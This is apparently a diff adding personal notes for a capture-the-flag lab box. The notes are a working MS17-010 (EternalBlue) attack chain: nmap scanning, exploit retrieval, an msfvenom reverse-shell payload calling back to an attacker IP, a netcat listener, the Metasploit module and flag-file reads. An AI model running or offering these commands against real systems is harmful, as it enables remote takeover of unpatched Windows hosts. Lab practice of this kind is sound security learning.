@@ -1,0 +1,45 @@
+sudo nmap -sC -sV -O -oA initial 10.10.10.40
+sudo nmap -sC -sV -O -p- -oA full 10.10.10.40
+sudo nmap -sU -O -p- -oA udp 10.10.10.40
+nmap --script vuln -oA vuln 10.10.10.40
+# ^ runs vuln scripts, informs of vuln and vulnID
+searchsploit --id MS17-010
+# ^ gets options on vulnID
+searchsploit -m 42315
+# ^ pulls exploit for vuln
+less 42315.py
+# ^ code review
+wget https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py
+mv 42315.py.1 mysmb.py
+# ^ allows script to import per code review findings
+msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.6 LPORT=4444 > eternal-blue.exe
+# ^ generate an exe with reverse shell
+enum4linux -a 10.10.10.40
+# ^ verify user findings from initial scan
+# add newly found creds to the exploit
+# add '/path/to/eternal-blue.exe', C, '/eternal-blue.exe' to smb_pwn section
+# add r'cmd /c c:\eternal-blue.exe' to smb_pwn section
+nc -nlvp 4444
+python 42315.py 10.10.10.40
+# ^ oops
+sudo pip install impacket
+python 42315.py 10.10.10.40
+# ^ nope
+# ^ return to line 19, prepend \\ to user
+# ^ nope
+msfconsole
+search exploit/windows/smb
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 10.10.10.40
+set LHOST 10.10.14.3
+set payload windows/x64/shell/reverse_tcp  
+# ^ end nc listener before running
+run
+whoami
+# ^ success
+type c:\users\haris\desktop\user.txt
+type c:\users\administrator\desktop\root.txt
+
+
+[box complete]
